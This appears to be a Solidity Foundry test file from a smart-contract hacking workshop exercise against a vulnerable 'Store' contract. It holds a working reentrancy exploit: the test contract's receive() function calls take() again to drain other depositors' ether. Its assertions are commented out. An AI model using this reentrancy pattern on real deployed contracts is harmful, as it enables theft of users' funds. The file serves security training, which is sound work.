// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Store} from "../src/SolidityHackingWorkshopV8.sol";

/**
 reentrancy attack is possible in the for loop 
 */

contract Exercise1_Store is Test {
    Store public store;

    // address attacker = vm.addr(3);

    function setUp() public {
        store = new Store();
    }

    function test_ReentrancyBreach() public {
        address userA = vm.addr(1);
        address userB = vm.addr(2);

        vm.deal(userA, 2 ether);
        vm.deal(userB, 3 ether);
        vm.deal(address(this), 3 ether);

        // user a stores his money
        // vm.startPrank(userA);
        // store.store{value: 2 ether}();
        // vm.stopPrank();

        // user b stores his money
        vm.startPrank(userB);
        store.store{value: 1 ether}();
        vm.stopPrank();

        // attacker stores his money
        // vm.startPrank(attacker);
        store.store{value: 1 ether}();
        console.log(uint256(address(this).balance));

        // require(address(store).balance == 6 ether, "failed to store money");

        store.take();

        // require(
        //     address(this).balance == 6 ether,
        //     "invalid attacker balance after take execution"
        // );

        vm.stopPrank();
    }

    receive() external payable {
        address(store).call(abi.encodeWithSignature("take()"));
    }

    // receive() external payable {
    //     console.log("receive");

    //     console.log(uint(address(store).balance));
    //     if (address(store).balance != 0) {
    //         store.take();
    //     }
    // }
}
